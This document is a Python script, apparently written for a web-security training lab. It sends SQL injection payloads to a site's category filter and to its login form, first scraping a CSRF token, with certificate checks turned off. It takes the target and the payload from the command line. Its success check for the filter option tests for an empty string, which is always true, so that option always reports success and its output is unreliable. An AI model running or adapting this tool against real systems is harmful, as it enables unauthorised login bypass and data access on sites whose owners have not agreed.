import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SQLIExploit:

    def __init__(self, url):
        self.url = url
        self.session = requests.Session()

    def get_csrf_token(self):
        r = self.session.get(self.url, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        input_tag = soup.find("input")
        if input_tag is not None:
            csrf = input_tag.get('value')
            return csrf
        else:
            raise ValueError("CSRF token not found in the HTML.")

    def exploit_sqli(self, payload):
        uri = '/filter?category='
        r = self.session.get(self.url + uri + payload, verify=False)
        if "" in r.text:
            print(r.text)
            return True
        else:
            return False

    def login_with_sqli(self, sqli_payload):
        try:
            csrf_token = self.get_csrf_token()
            data = {"csrf": csrf_token,
                    "username": sqli_payload,
                    "password": "randomtext"}

            r = self.session.post(self.url, data=data, verify=False)
            res = r.text
            if "Log out" in res:
                print('[+] SQL injection successful! We have logged in as the administrator user.')
            else:
                print('[-] SQL injection unsuccessful.')
        except Exception as e:
            print(f"[-] An error occurred: {e}")

def main():
    try:
        url = sys.argv[1].strip()
        option = sys.argv[2].strip()
        payload = sys.argv[3].strip()
    except IndexError:
        print('[-] Usage: %s <url> <option> <payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com sqli "1=1"' % sys.argv[0])
        print('[-] Example: %s www.example.com login "payload"' % sys.argv[0])
        sys.exit(-1)

    sqli_exploit = SQLIExploit(url)
    
    if option == 'sqli':
        if sqli_exploit.exploit_sqli(payload):
            print('[+] SQL injection successful!')
        else:
            print('[-] SQL injection unsuccessful.')
    elif option == 'login':
        sqli_exploit.login_with_sqli(payload)
    else:
        print('[-] Invalid option. Use "sqli" for SQL injection or "login" for login with CSRF token.')

if __name__ == "__main__":
    main()
